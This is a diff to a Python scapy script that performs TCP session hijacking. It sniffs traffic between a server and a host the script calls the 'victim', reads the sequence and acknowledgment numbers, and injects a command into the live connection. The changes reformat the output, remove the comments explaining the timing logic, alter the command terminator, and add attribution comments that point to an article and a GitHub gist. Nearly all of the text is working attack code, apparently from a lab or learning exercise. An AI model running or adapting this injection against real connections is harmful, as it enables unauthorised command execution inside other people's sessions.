@@ -20,7 +20,7 @@ prev_client_load = None
 def packet_listen_callback(pkt):
     global count, server_host, server_port, victim_host, victim_port, prev_client_load
     count += 1
-    print("---------------- " + str(count) + " ------------------")
+    print("---------------- {0} ------------------".format(str(count)))
     real_packet = pkt_to_json(pkt.show(dump=True))
     print('seq: ' + real_packet['tcp']['seq'])
     print('ack: ' + real_packet['tcp']['ack'])
@@ -32,14 +32,9 @@ def packet_listen_callback(pkt):
             victim_host = real_packet['ip']['src']
             victim_port = int(real_packet['tcp']['sport'])
         print("TO host\t" + real_packet['ip']['dst'])
-        # We wait for "A" flag - when user has acknowledged a response from the server.
-        # Can just send new message here with the same seq and ack code.
-        # We also want to ensure that we are waiting for the command to be executed
-        # only after the last command by the user has been executed.
-        # Therefore we wait for the last known payload to be '\r\n'.
 
-        if prev_client_load is not None and '\\r\\n' in prev_client_load and real_packet['tcp']['flags'] == 'A':
-            data = "A\r\n"  # The command we'll be sending
+        if prev_client_load is not None and '\\r' in prev_client_load and real_packet['tcp']['flags'] == 'A':
+            data = "A\r"  # The command we'll be sending
             seq = int(real_packet['tcp']['seq'])
             ack = int(real_packet['tcp']['ack'])
             print("------------- SENDING ---------------")
@@ -64,4 +59,5 @@ def packet_listen_callback(pkt):
 
 sniff(filter="tcp and host " + server_host + " and tcp port " + str(server_port), prn=packet_listen_callback)
 
-# Article at https://zya.page.link/tcpjack
+# Code pris sur https://zya.page.link/tcpjack
+# Program forked from https://gist.github.com/ZY-Ang/7af2454c75b48b2bd189c13544b5e27d
